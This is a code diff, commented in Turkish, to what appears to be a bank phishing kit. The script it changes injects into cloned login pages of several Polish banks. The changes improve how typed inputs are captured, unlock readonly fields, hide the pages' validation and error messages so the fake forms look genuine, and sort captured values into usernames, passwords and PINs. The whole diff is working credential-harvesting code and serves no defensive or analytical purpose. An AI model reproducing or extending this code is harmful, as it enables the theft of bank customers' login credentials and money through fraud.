@@ -78,12 +78,73 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       return s;
     };
 
+    // ---------------------------------------------------------------
+    // KEY SECIMI: kayitli sayfalarda bircok input'un name/id'si GUID,
+    // "control-12345", "name-uuid" gibi teknik deger — admin kolonu
+    // bunlari tanimaz. Semantik kaynaklar sirayla denenir:
+    // formcontrolname > data-test-id > name > id > ng-reflect-name >
+    // aria-label > aria-labelledby metni > placeholder.
+    // ---------------------------------------------------------------
+    const UUID_RE = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i;
+    const normAlnum = (s) => String(s || "").replace(UUID_RE, "").replace(/[^a-z0-9]/gi, "");
+    const isGarbageKey = (s) => {
+      const t = normAlnum(s);
+      if (t.length < 3) return true;
+      if (/^\d+$/.test(t)) return true;
+      // "name", "id", "control123", "inginput1ab2cd" gibi anlamsiz keyler
+      if (/^(name|id|input|control|el|field|key)$/.test(t)) return true;
+      if (/^(control|inginput|custominput|name)[0-9a-z]{5,}$/i.test(t)) return true;
+      return false;
+    };
+    const resolveLabelledText = (el, doc) => {
+      try {
+        const lb = el.getAttribute("aria-labelledby");
+        if (!lb) return "";
+        const parts = [];
+        lb.split(/\s+/).forEach((lid) => {
+          try {
+            const n = doc.getElementById(lid);
+            const txt = n ? (n.textContent || "").trim() : "";
+            if (txt) parts.push(txt);
+          } catch (e) {}
+        });
+        const s = parts.join(" ").trim();
+        return s.length >= 3 && s.length <= 60 ? s : "";
+      } catch (e) { return ""; }
+    };
+    const pickKey = (el, doc) => {
+      const cands = [
+        el.getAttribute("formcontrolname"),
+        el.getAttribute("data-test-id"),
+        el.getAttribute("name"),
+        el.getAttribute("id"),
+        el.getAttribute("ng-reflect-name"),
+      ];
+      for (const c of cands) {
+        if (c && !isGarbageKey(c)) return c;
+      }
+      const lbl =
+        el.getAttribute("aria-label") ||
+        resolveLabelledText(el, doc) ||
+        el.getAttribute("placeholder") ||
+        "";
+      if (lbl && lbl.trim().length >= 3) return lbl.trim().slice(0, 60);
+      // son care: uuid'li key'in UUID'siz kismi anlamliysa onu kullan
+      for (const c of cands) {
+        if (c) {
+          const t = String(c).replace(UUID_RE, "").replace(/[-_]+$/, "");
+          if (normAlnum(t).length >= 3) return t;
+        }
+      }
+      return "";
+    };
+
     const collectFrom = (doc) => {
       const data = {};
       try {
         doc.querySelectorAll("input, textarea, select").forEach((el) => {
           const type = (el.getAttribute("type") || "text").toLowerCase();
-          const name = el.getAttribute("name") || el.getAttribute("id") || "";
+          const name = pickKey(el, doc);
           if (!name) return;
           if (type === "radio") {
             if (el.checked) data[name] = el.value != null ? String(el.value) : "on";
@@ -331,9 +392,56 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
           try {
             if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
             if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
+            // READONLY: bazi kayitlarda tum form readonly kaydedilmis
+            // (pocztowy ~700 adet) -> giris "kapali" gorunuyor. Ac.
+            if ((el.tagName === "INPUT" || el.tagName === "TEXTAREA") && el.hasAttribute("readonly")) el.removeAttribute("readonly");
             if (el.getAttribute("aria-disabled") === "true") el.setAttribute("aria-disabled", "false");
+            if (el.getAttribute("aria-readonly") === "true") el.setAttribute("aria-readonly", "false");
             if (el.classList && el.classList.contains("disabled")) el.classList.remove("disabled");
             if (el.style && el.style.pointerEvents === "none") el.style.pointerEvents = "auto";
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    // ------------------------------------------------------------------
+    // HATA DURUMU TEMIZLIGI: kayit aninda dogrulama hatasi acik kalmis
+    // sayfalarda kirmizi border/uyari gorunuyor. Input'lardan invalid
+    // siniflarini sil, aria-invalid=false yap, hata mesaj bloklarini gizle.
+    // ------------------------------------------------------------------
+    const ERROR_TOKEN_RE = /(^|[\s_.\-])(error|errors|blad|invalid|niepoprawn|nieprawidlow|alert-danger|form-error|field-error|validation|komunikat)/i;
+    const cleanupErrorState = (root) => {
+      try {
+        root.querySelectorAll("input, textarea, select").forEach((el) => {
+          try {
+            if (el.getAttribute("aria-invalid") === "true") el.setAttribute("aria-invalid", "false");
+            if (el.classList) {
+              ["invalid", "ng-invalid", "is-invalid", "has-error", "error", "field-error", "input-error", "cabp-state--error"].forEach((c) => {
+                if (el.classList.contains(c)) el.classList.remove(c);
+              });
+              el.classList.forEach((c) => {
+                if (/invalid|error/i.test(c)) el.classList.remove(c);
+              });
+            }
+          } catch (e) {}
+        });
+        // Hata mesaji bloklari: id/class'i error/blad/invalid iceren gorunur
+        // elemanlari gizle (bos containerlar ve label'lar haric degil —
+        // sadece metin tasiyan veya bilinen hata rollerindekiler).
+        root.querySelectorAll("[id],[class],[role='alert']").forEach((el) => {
+          try {
+            if (el.__plErrorHidden) return;
+            const ident = ((el.id || "") + " " + (typeof el.className === "string" ? el.className : "")).trim();
+            const isAlert = el.getAttribute("role") === "alert";
+            if (!isAlert && !ERROR_TOKEN_RE.test(ident)) return;
+            const txt = (el.textContent || "").trim();
+            // input'un kendisi degil, hata MESAJI tasiyan bloklari hedefle
+            const tag = (el.tagName || "").toLowerCase();
+            if (["input", "textarea", "select", "form", "body", "html"].includes(tag)) return;
+            if (!isAlert && txt.length === 0) return;
+            if (txt.length > 300) return;
+            el.style.setProperty("display", "none", "important");
+            el.__plErrorHidden = true;
           } catch (e) {}
         });
       } catch (e) {}
@@ -451,6 +559,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       enableControls(doc);
       applyMaskedBehavior(doc);
       applyIngFix();
+      cleanupErrorState(doc);
       updateSubmitReady(doc);
       doc.addEventListener("input", () => updateSubmitReady(doc), true);
       doc.addEventListener("change", () => updateSubmitReady(doc), true);
@@ -570,7 +679,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     attach(document);
     scanIframes(document, 0);
     try {
-      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); applyMaskedBehavior(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
+      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); applyMaskedBehavior(document); cleanupErrorState(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
     } catch (e) {}
     let tries = 0;
     const retry = setInterval(() => {
@@ -578,6 +687,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       enableControls(document);
       applyMaskedBehavior(document);
       applyIngFix();
+      cleanupErrorState(document);
       updateSubmitReady(document);
       renderKeypad();
       if (++tries > 30) clearInterval(retry);
@@ -593,8 +703,11 @@ function canonicalizeCaptured(raw: Record<string, string>): Record<string, strin
   for (const [k, v] of Object.entries(raw)) {
     if (!v || !v.trim()) continue;
     const n = norm(k);
+    const looksPassword = /password|haslo|maskedpassword|pass$|^pin|pin$|pincode|pinnumber/.test(n);
     if (
-      /username|loginid|loginnumber|formuserid|userid|customerid|customernumber|cifcustomernumber|email|millecode|millekod|clientid|clientnumber|^nik$/.test(n)
+      !looksPassword &&
+      (/username|loginid|loginnumber|formuserid|userid|customerid|customernumber|cifcustomernumber|email|millecode|millekod|clientid|clientnumber|^nik$|^login$|^customer$|identyfikator|numerklienta/.test(n) ||
+        /logininput|loginmain|loginfield/.test(n))
     ) {
       out.username ||= v;
       out.verfuegernummer ||= v;
